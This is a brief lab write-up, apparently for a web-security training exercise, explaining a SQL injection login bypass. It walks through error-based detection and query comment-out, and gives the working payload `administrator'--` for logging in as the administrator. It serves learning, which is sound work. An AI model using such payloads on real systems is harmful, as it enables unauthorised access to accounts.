SQL injection vulnerability in the login function

End Goal: Perform SQLI attack and log in as the administrator user.

Analysis:
--------

Passing injection character ' returned Internal Server Error -- This indicates that app is vulnerable to SQL Injection.


Example SQL:
SELECT * FROM users where username = 'admin' and password = 'admin'
using '-- will ignore password condition e.g.
SELECT * FROM users where username =''-- and password = 'admin' -- This ignores the "and password = 'admin'"

The goal says administrator user - use this as username.

Exploit: administrator'--
